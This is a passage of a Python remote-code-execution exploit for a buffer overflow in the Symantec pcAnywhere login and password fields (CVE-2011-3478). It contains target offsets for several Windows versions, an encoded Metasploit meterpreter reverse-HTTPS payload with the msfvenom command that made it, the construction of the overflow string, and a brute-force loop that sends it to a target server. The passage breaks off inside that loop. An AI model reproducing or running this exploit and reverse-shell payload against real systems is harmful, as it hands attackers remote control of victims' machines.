sevenUltSP1&nbsp;&nbsp;=&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Version&#39;:&nbsp;&#39;Microsoft&nbsp;Windows&nbsp;7&nbsp;Ultimate&nbsp;SP1&nbsp;x86&nbsp;EN&#39;,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;Offset&#39;:&nbsp;0x03fa0000,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;PasswordStringLength&#39;:&nbsp;3500,
&nbsp;&nbsp;&nbsp;&nbsp;&#39;TestAttempts&#39;:&nbsp;[23,&nbsp;49,&nbsp;98,&nbsp;28,&nbsp;4,&nbsp;31,&nbsp;4,&nbsp;42,&nbsp;50,&nbsp;42]
};
#&nbsp;target&nbsp;server&nbsp;OS
#&nbsp;&gt;&gt;&gt;&nbsp;MODIFY&nbsp;THIS&nbsp;&gt;&gt;&gt;
#OSdictionary&nbsp;=&nbsp;vistaUltSP1
#OSdictionary&nbsp;=&nbsp;vistaUltSP2
#OSdictionary&nbsp;=&nbsp;s2k8EntSP2
#OSdictionary&nbsp;=&nbsp;sevenProSP1
OSdictionary&nbsp;=&nbsp;sevenUltSP1
#&nbsp;timeout&nbsp;values
shellcodeExecutionTimeout&nbsp;=&nbsp;30
#&nbsp;client-server&nbsp;handshake
initialisationSequence&nbsp;=&nbsp;&quot;\x00\x00\x00\x00&quot;
handshakeSequence&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&quot;\x0d\x06\xfe&quot;
#&nbsp;username&nbsp;string
usernameString&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&quot;U&quot;&nbsp;*&nbsp;175
#&nbsp;shellcode
#&nbsp;available&nbsp;shellcode&nbsp;space:&nbsp;1289&nbsp;bytes
#&nbsp;shellcode&nbsp;generated&nbsp;with&nbsp;Metasploit&nbsp;Framework&nbsp;Version:&nbsp;4.11.4-2015090201&nbsp;(Kali&nbsp;2.0)
#&nbsp;msfvenom&nbsp;-a&nbsp;x86&nbsp;--platform&nbsp;windows&nbsp;-p&nbsp;windows/meterpreter/reverse_https&nbsp;LHOST=192.168.80.223&nbsp;LPORT=443&nbsp;EXITFUNC=seh&nbsp;-e&nbsp;x86/shikata_ga_nai&nbsp;-b&nbsp;&#39;\x00&#39;&nbsp;-f&nbsp;python&nbsp;-v&nbsp;shellcode
#&nbsp;&gt;&gt;&gt;&nbsp;MODIFY&nbsp;THIS&nbsp;&gt;&gt;&gt;
shellcode&nbsp;=&nbsp;&nbsp;&quot;&quot;
shellcode&nbsp;+=&nbsp;&quot;\xda\xd3\xd9\x74\x24\xf4\xbf\x2c\x46\x39\x97\x5d&quot;
shellcode&nbsp;+=&nbsp;&quot;\x33\xc9\xb1\x87\x83\xed\xfc\x31\x7d\x14\x03\x7d&quot;
shellcode&nbsp;+=&nbsp;&quot;\x38\xa4\xcc\x6b\xa8\xaa\x2f\x94\x28\xcb\xa6\x71&quot;
shellcode&nbsp;+=&nbsp;&quot;\x19\xcb\xdd\xf2\x09\xfb\x96\x57\xa5\x70\xfa\x43&quot;
shellcode&nbsp;+=&nbsp;&quot;\x3e\xf4\xd3\x64\xf7\xb3\x05\x4a\x08\xef\x76\xcd&quot;
shellcode&nbsp;+=&nbsp;&quot;\x8a\xf2\xaa\x2d\xb3\x3c\xbf\x2c\xf4\x21\x32\x7c&quot;
shellcode&nbsp;+=&nbsp;&quot;\xad\x2e\xe1\x91\xda\x7b\x3a\x19\x90\x6a\x3a\xfe&quot;
shellcode&nbsp;+=&nbsp;&quot;\x60\x8c\x6b\x51\xfb\xd7\xab\x53\x28\x6c\xe2\x4b&quot;
shellcode&nbsp;+=&nbsp;&quot;\x2d\x49\xbc\xe0\x85\x25\x3f\x21\xd4\xc6\xec\x0c&quot;
shellcode&nbsp;+=&nbsp;&quot;\xd9\x34\xec\x49\xdd\xa6\x9b\xa3\x1e\x5a\x9c\x77&quot;
shellcode&nbsp;+=&nbsp;&quot;\x5d\x80\x29\x6c\xc5\x43\x89\x48\xf4\x80\x4c\x1a&quot;
shellcode&nbsp;+=&nbsp;&quot;\xfa\x6d\x1a\x44\x1e\x73\xcf\xfe\x1a\xf8\xee\xd0&quot;
shellcode&nbsp;+=&nbsp;&quot;\xab\xba\xd4\xf4\xf0\x19\x74\xac\x5c\xcf\x89\xae&quot;
shellcode&nbsp;+=&nbsp;&quot;\x3f\xb0\x2f\xa4\xad\xa5\x5d\xe7\xb9\x57\x3b\x6c&quot;
shellcode&nbsp;+=&nbsp;&quot;\x39\xc0\xb4\xe5\x57\x79\x6f\x9e\xeb\x0e\xa9\x59&quot;
shellcode&nbsp;+=&nbsp;&quot;\x0c\x25\x84\xbe\xa1\x95\xb4\x13\x16\x72\x01\xc2&quot;
shellcode&nbsp;+=&nbsp;&quot;\xe1\x25\x8a\x3f\x42\x79\x1f\xc3\x37\x2e\xb7\x78&quot;
shellcode&nbsp;+=&nbsp;&quot;\xb6\xd0\x47\x97\x86\xd1\x47\x67\xd9\x84\x3f\x54&quot;
shellcode&nbsp;+=&nbsp;&quot;\x6e\x11\x95\xaa\x3a\x37\x6f\xa8\xf7\xbe\xf8\x1d&quot;
shellcode&nbsp;+=&nbsp;&quot;\x4c\x16\x73\x50\x25\xc2\x0c\xa6\x91\xc1\xb0\x8b&quot;
shellcode&nbsp;+=&nbsp;&quot;\x53\x69\x76\x22\xd9\x46\x0a\x1a\xbc\xea\x87\xf9&quot;
shellcode&nbsp;+=&nbsp;&quot;\x09\xb2\x10\xcf\x14\x3c\xd0\x56\xb3\xc8\xba\xe0&quot;
shellcode&nbsp;+=&nbsp;&quot;\x69\x5a\x3a\xa2\xff\xf0\xf2\x73\x92\x4b\x79\x10&quot;
shellcode&nbsp;+=&nbsp;&quot;\x02\x3f\x4f\xdc\x8f\xdb\xe7\x4f\x6d\x1d\xa9\x1d&quot;
shellcode&nbsp;+=&nbsp;&quot;\x42\x0c\x70\x80\xcc\xe9\xe5\x0a\x55\x80\x8a\xc2&quot;
shellcode&nbsp;+=&nbsp;&quot;\x3d\x2a\x2f\xa5\xe2\xf1\xfe\x7d\x2a\x86\x6b\x08&quot;
shellcode&nbsp;+=&nbsp;&quot;\x27\x33\x2a\xbb\xbf\xf9\xd9\x7a\x7d\x87\x4f\x10&quot;
shellcode&nbsp;+=&nbsp;&quot;\xed\x0d\x1b\xad\x88\xc6\xb8\x50\x07\x6a\x74\xf1&quot;
shellcode&nbsp;+=&nbsp;&quot;\xd3\x2d\xd9\x84\x4e\xc0\x8e\x25\x23\x76\x60\xc9&quot;
shellcode&nbsp;+=&nbsp;&quot;\xb4\xd9\xf5\x64\x0e\x8e\xa6\x22\x05\x39\x3f\x98&quot;
shellcode&nbsp;+=&nbsp;&quot;\x96\x8e\xca\x4f\x79\x54\x64\x26\x33\x3d\xe7\xaa&quot;
shellcode&nbsp;+=&nbsp;&quot;\xa2\xb1\x90\x59\x4b\x74\x1a\xce\xf9\x0a\xc6\xd8&quot;
shellcode&nbsp;+=&nbsp;&quot;\xcc\x99\x49\x75\x47\x33\x0e\x1c\xd5\xf9\xde\xad&quot;
shellcode&nbsp;+=&nbsp;&quot;\xa3\x8c\x1e\x02\x3b\x38\x96\x3d\x7d\x39\x7d\xc8&quot;
shellcode&nbsp;+=&nbsp;&quot;\x47\x95\x16\xcb\x75\xfa\x63\x98\x2a\xa9\x3c\x4c&quot;
shellcode&nbsp;+=&nbsp;&quot;\x9a\x25\x28\x27\x0c\x8d\x51\x1d\xc6\x9b\xa7\xc1&quot;
shellcode&nbsp;+=&nbsp;&quot;\x8e\xdb\x8b\xfd\x4e\x55\x0b\x97\x4a\x35\xa6\x77&quot;
shellcode&nbsp;+=&nbsp;&quot;\x04\xdd\x43\xce\x36\x9b\x53\x1b\x15\xf7\xf8\xf7&quot;
shellcode&nbsp;+=&nbsp;&quot;\xcf\x9f\xd3\xf1\xf7\x24\xd3\x2b\x82\x1b\x5e\xdc&quot;
shellcode&nbsp;+=&nbsp;&quot;\xc3\xee\x78\x34\x90\x10\x7b\xc5\x4c\x51\x13\xc5&quot;
shellcode&nbsp;+=&nbsp;&quot;\x80\x51\xe3\xad\xa0\x51\xa3\x2d\xf3\x39\x7b\x8a&quot;
shellcode&nbsp;+=&nbsp;&quot;\xa0\x5c\x84\x07\xd5\xcc\x28\x21\x3e\xa5\xa6\x31&quot;
shellcode&nbsp;+=&nbsp;&quot;\xe0\x4a\x37\x61\xb6\x22\x25\x13\xbf\x51\xb6\xce&quot;
shellcode&nbsp;+=&nbsp;&quot;\x3a\x55\x3d\x3e\xcf\x51\xbf\x03\x4a\x9d\xca\x66&quot;
shellcode&nbsp;+=&nbsp;&quot;\x0c\xdd\x6a\x81\xdb\x1e\x6b\xae\x12\xd8\xa6\x7f&quot;
shellcode&nbsp;+=&nbsp;&quot;\x65\x2c\xff\x51\xbd\x60\xd1\x9f\x8f\xb3\x2d\x5b&quot;
shellcode&nbsp;+=&nbsp;&quot;\x11\xbd\x1f\x71\x87\xc2\x0c\x7a\x82\xa9\xb2\x47&quot;
################################
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;BUFFER&nbsp;OVERFLOW&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###
###&nbsp;&nbsp;&nbsp;STRING&nbsp;CONSTRUCTION&nbsp;&nbsp;&nbsp;&nbsp;###
################################
#&nbsp;Calculate&nbsp;address&nbsp;values&nbsp;based&nbsp;on&nbsp;the&nbsp;OS&nbsp;offset
pointerLocationAddress&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;OSdictionary[&#39;Offset&#39;]&nbsp;+&nbsp;0x00005ad8
pointerForECXplus8Address&nbsp;=&nbsp;OSdictionary[&#39;Offset&#39;]&nbsp;+&nbsp;0x00005ad4
breakPointAddress&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;OSdictionary[&#39;Offset&#39;]&nbsp;+&nbsp;0x000065af&nbsp;-&nbsp;0x00010000
#&nbsp;jump&nbsp;over&nbsp;the&nbsp;next&nbsp;38&nbsp;bytes&nbsp;(to&nbsp;the&nbsp;begining&nbsp;of&nbsp;the&nbsp;shellcode)
jumpToShellcode&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&quot;\xeb\x26\x90\x90&quot;
#&nbsp;pointerLocationAddress&nbsp;-&nbsp;the&nbsp;memory&nbsp;address&nbsp;location&nbsp;of&nbsp;the&nbsp;&quot;pointerForECXplus8&quot;&nbsp;variable
pointerLocation&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;struct.pack(&#39;&lt;L&#39;,&nbsp;pointerLocationAddress)
#&nbsp;CALL&nbsp;ESI&nbsp;from&nbsp;the&nbsp;application&nbsp;module&nbsp;ijl20.dll&nbsp;[aslr=false,rebase=false,safeseh=false]
callESI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;struct.pack(&#39;&lt;L&#39;,&nbsp;0x67f7ab23)
#&nbsp;pointerForECXplus8Address&nbsp;-&nbsp;the&nbsp;memory&nbsp;address&nbsp;location&nbsp;of&nbsp;the&nbsp;start&nbsp;of&nbsp;the&nbsp;DDDD&nbsp;string&nbsp;in&nbsp;the&nbsp;shellcode&nbsp;(Offset&nbsp;+&nbsp;0x00005acc&nbsp;+&nbsp;0x8)
pointerForECXplus8&nbsp;=&nbsp;struct.pack(&#39;&lt;L&#39;,&nbsp;pointerForECXplus8Address)
#&nbsp;construct&nbsp;the&nbsp;password&nbsp;string&nbsp;which&nbsp;will&nbsp;cause&nbsp;a&nbsp;buffer&nbsp;overflow&nbsp;condition&nbsp;and&nbsp;exploit&nbsp;the&nbsp;vulnerability
passwordString&nbsp;=&nbsp;(
&nbsp;&nbsp;&nbsp;&nbsp;&quot;A&quot;&nbsp;*&nbsp;945&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;jumpToShellcode&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;pointerLocation&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;&quot;D&quot;&nbsp;*&nbsp;4&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;pointerForECXplus8&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;callESI&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;&quot;\x90&quot;&nbsp;*&nbsp;20&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;shellcode&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;&quot;I&quot;&nbsp;*&nbsp;(1289&nbsp;-&nbsp;len(shellcode))&nbsp;+
&nbsp;&nbsp;&nbsp;&nbsp;&quot;\xaa&quot;&nbsp;*&nbsp;(OSdictionary[&#39;PasswordStringLength&#39;]&nbsp;-&nbsp;945&nbsp;-&nbsp;4&nbsp;*&nbsp;5&nbsp;-&nbsp;20&nbsp;-&nbsp;1289)
)
################################
###&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;FUNCTIONS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;###
################################
#&nbsp;calculate&nbsp;and&nbsp;return&nbsp;the&nbsp;median&nbsp;value&nbsp;of&nbsp;the&nbsp;argument&nbsp;list
def&nbsp;calculateMedian(targetList):
&nbsp;&nbsp;&nbsp;&nbsp;sortedTargetList&nbsp;=&nbsp;sorted(targetList)
&nbsp;&nbsp;&nbsp;&nbsp;targetListLength&nbsp;=&nbsp;len(targetList)
&nbsp;&nbsp;&nbsp;&nbsp;medianIndex&nbsp;=&nbsp;(targetListLength&nbsp;-&nbsp;1)&nbsp;/&nbsp;2
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(targetListLength&nbsp;%&nbsp;2):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;sortedTargetList[medianIndex]
&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;((sortedTargetList[medianIndex]&nbsp;+&nbsp;sortedTargetList[medianIndex&nbsp;+&nbsp;1])&nbsp;/&nbsp;2)
#&nbsp;print&nbsp;an&nbsp;indented&nbsp;line&nbsp;with&nbsp;a&nbsp;type&nbsp;prefix
def&nbsp;printLine(infoType,&nbsp;indentDepth,&nbsp;textToDisplay):
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;[I]nformational
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;infoType&nbsp;==&nbsp;&quot;I&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(&#39;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&nbsp;*&nbsp;indentDepth),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\033[1;37m[*]\033[1;m&quot;,&nbsp;textToDisplay
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;[E]rror
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;infoType&nbsp;==&nbsp;&quot;E&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(&#39;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&nbsp;*&nbsp;indentDepth),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\033[1;31m[-]\033[1;m&quot;,&nbsp;textToDisplay
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;[S]uccess
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;infoType&nbsp;==&nbsp;&quot;S&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(&#39;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&nbsp;*&nbsp;indentDepth),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\033[1;32m[+]\033[1;m&quot;,&nbsp;textToDisplay
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;[W]arning
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;infoType&nbsp;==&nbsp;&quot;W&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(&#39;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&nbsp;*&nbsp;indentDepth),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;\033[1;33m[!]\033[1;m&quot;,&nbsp;textToDisplay
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;[N]one
&nbsp;&nbsp;&nbsp;&nbsp;elif&nbsp;infoType&nbsp;==&nbsp;&quot;N&quot;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;(&#39;&nbsp;&nbsp;&nbsp;&nbsp;&#39;&nbsp;*&nbsp;indentDepth),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;textToDisplay
#&nbsp;print&nbsp;the&nbsp;banner&nbsp;-&nbsp;general&nbsp;exploit&nbsp;info,&nbsp;target&nbsp;info,&nbsp;target&nbsp;OS&nbsp;statistics
def&nbsp;printBanner():
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;0,&nbsp;&quot;Symantec&nbsp;pcAnywhere&nbsp;v12.5.0&nbsp;Build&nbsp;442&nbsp;Login+Password&nbsp;field&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;N&quot;,&nbsp;1,&nbsp;&quot;Buffer&nbsp;Overflow&nbsp;Remote&nbsp;Code&nbsp;Execution&nbsp;exploit&nbsp;(CVE-2011-3478)&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;1,&nbsp;&quot;by&nbsp;Tomislav&nbsp;Paskalev&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;0,&nbsp;&quot;Target&nbsp;server&nbsp;information&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;1,&nbsp;&quot;IP&nbsp;address&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;targetServer)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;1,&nbsp;&quot;Port&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;str(targetPort))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;0,&nbsp;&quot;Exploit&nbsp;target&nbsp;information&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;1,&nbsp;&quot;Target&nbsp;OS&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;OSdictionary[&#39;Version&#39;])
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Offset&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;&quot;{:#010x}&quot;.format(OSdictionary[&#39;Offset&#39;]))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Breakpoint&nbsp;(test)&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;&quot;{:#010x}&quot;.format(breakPointAddress))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Password&nbsp;length&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;str(OSdictionary[&#39;PasswordStringLength&#39;]))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Test&nbsp;result&nbsp;stats&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;3,&nbsp;&quot;Test&nbsp;count&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;str(len(OSdictionary[&#39;TestAttempts&#39;])))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;3,&nbsp;&quot;Reliability&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;str(((len(OSdictionary[&#39;TestAttempts&#39;])&nbsp;-&nbsp;OSdictionary[&#39;TestAttempts&#39;].count(0))&nbsp;*&nbsp;100)&nbsp;/&nbsp;len(OSdictionary[&#39;TestAttempts&#39;]))&nbsp;+&nbsp;&quot;%&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;3,&nbsp;&quot;Min&nbsp;attempt&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;str(min([element&nbsp;for&nbsp;element&nbsp;in&nbsp;OSdictionary[&#39;TestAttempts&#39;]&nbsp;if&nbsp;element&nbsp;&gt;&nbsp;0])))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;3,&nbsp;&quot;Max&nbsp;attempt&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;str(max(OSdictionary[&#39;TestAttempts&#39;])))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;3,&nbsp;&quot;Avg&nbsp;attempt&nbsp;&nbsp;&nbsp;:&nbsp;&quot;&nbsp;+&nbsp;str(sum(OSdictionary[&#39;TestAttempts&#39;])&nbsp;/&nbsp;len(OSdictionary[&#39;TestAttempts&#39;])))
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;3,&nbsp;&quot;Median&nbsp;attempt:&nbsp;&quot;&nbsp;+&nbsp;str(calculateMedian(OSdictionary[&#39;TestAttempts&#39;])))
#&nbsp;connect&nbsp;to&nbsp;the&nbsp;server&nbsp;and&nbsp;return&nbsp;the&nbsp;socket
def&nbsp;connectToServer(server,&nbsp;port):
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;create&nbsp;socket
&nbsp;&nbsp;&nbsp;&nbsp;targetSocket&nbsp;=&nbsp;socket.socket(socket.AF_INET,&nbsp;socket.SOCK_STREAM)
&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;targetSocket.connect((server,&nbsp;port))
&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;socket.error&nbsp;as&nbsp;msg:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;[Errno&nbsp;111]&nbsp;Connection&nbsp;refused&quot;&nbsp;in&nbsp;str(msg):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;return&nbsp;the&nbsp;opened&nbsp;socket
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;targetSocket
#&nbsp;send&nbsp;the&nbsp;data&nbsp;to&nbsp;the&nbsp;server&nbsp;and&nbsp;return&nbsp;the&nbsp;response
def&nbsp;sendDataToServer(destSocket,&nbsp;dataToSend):
&nbsp;&nbsp;&nbsp;&nbsp;destSocket.send(dataToSend)
&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;receivedData&nbsp;=&nbsp;destSocket.recv(1024)
&nbsp;&nbsp;&nbsp;&nbsp;except&nbsp;socket.error&nbsp;as&nbsp;msg:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;[Errno&nbsp;104]&nbsp;Connection&nbsp;reset&nbsp;by&nbsp;peer&quot;&nbsp;in&nbsp;str(msg):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;None
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;receivedData
#&nbsp;run&nbsp;the&nbsp;exploit;&nbsp;exits&nbsp;when&nbsp;finished&nbsp;or&nbsp;interrupted
def&nbsp;runExploit():
&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;0,&nbsp;&quot;Starting&nbsp;exploit...&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;attemptCounter&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;brute&nbsp;force&nbsp;the&nbsp;service&nbsp;until&nbsp;the&nbsp;shellcode&nbsp;is&nbsp;successfully&nbsp;executed
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;connect&nbsp;to&nbsp;the&nbsp;target&nbsp;server
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;openSocket&nbsp;=&nbsp;connectToServer(targetServer,&nbsp;targetPort)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;attemptCounter&nbsp;+=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;sleepTimer&nbsp;=&nbsp;0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;1,&nbsp;&quot;Attempt&nbsp;no.&nbsp;&quot;&nbsp;+&nbsp;str(attemptCounter))
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;I&quot;,&nbsp;2,&nbsp;&quot;Sending&nbsp;initialisation&nbsp;sequence...&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;send&nbsp;the&nbsp;data;&nbsp;check&nbsp;outcome
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;receivedData&nbsp;=&nbsp;sendDataToServer(openSocket,&nbsp;initialisationSequence)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;check&nbsp;if&nbsp;server&nbsp;responded&nbsp;properly,&nbsp;if&nbsp;yes&nbsp;exit&nbsp;the&nbsp;loop
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;receivedData:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&quot;Please&nbsp;press&nbsp;&lt;Enter&gt;...&quot;&nbsp;in&nbsp;receivedData:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;exit&nbsp;if&nbsp;the&nbsp;service&nbsp;is&nbsp;unavailable
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;attemptCounter&nbsp;==&nbsp;1:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;printLine&nbsp;(&quot;E&quot;,&nbsp;3,&nbsp;&quot;Service&nbsp;unavailable&quot;)
